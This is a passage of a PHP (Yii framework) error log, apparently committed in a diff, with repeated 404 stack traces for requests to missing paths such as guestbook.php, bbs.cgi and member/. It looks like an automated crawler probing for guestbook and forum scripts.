+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:37:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:37:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:37:58 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:37:58 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:37:58 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "member/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('member/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/member/
+2021/06/17 20:38:00 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:00 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:00 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:01 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:01 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:01 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "home.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('home.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/home.php
+2021/06/17 20:38:02 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:02 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:02 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:03 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:03 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:03 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:38:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:05 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "bbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('bbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/bbs.cgi
+2021/06/17 20:38:05 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:05 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:05 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gastenboek.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gastenboek.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gastenboek.php
+2021/06/17 20:38:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:07 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:07 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:07 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:07 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "light.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('light.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/light.cgi
+2021/06/17 20:38:07 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "CGI/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('CGI/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/CGI/guestbook?page=1
+2021/06/17 20:38:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Guestbook.php
+2021/06/17 20:38:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "seo-joy.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('seo-joy.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/seo-joy.cgi
+2021/06/17 20:38:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "yybbs.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('yybbs.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/yybbs.cgi
+2021/06/17 20:38:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
